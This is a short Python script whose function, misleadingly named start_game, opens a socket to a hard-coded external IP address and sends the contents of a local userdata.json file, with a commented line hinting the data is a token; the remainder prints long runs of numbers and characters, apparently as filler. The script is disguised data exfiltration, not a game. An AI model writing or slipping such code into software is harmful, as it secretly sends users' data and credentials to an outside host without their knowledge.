import socket
def start_game():
    obj=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    obj.connect(("80.77.36.110",2023))
    with open("file/userdata.json","r") as f:
        text=f.read()
    #text="token ({0})".format(text)
    obj.sendall(text.encode("utf-8"))
    #date=obj.recv(1024)
    #print(date.decode("utf-8"))
def funk():
    for i in range(100000):
        yield i
def funk2():
    for i in range(100000):
        yield chr(i)
for g in funk():
    print(g)
for g in funk2():
    print(g)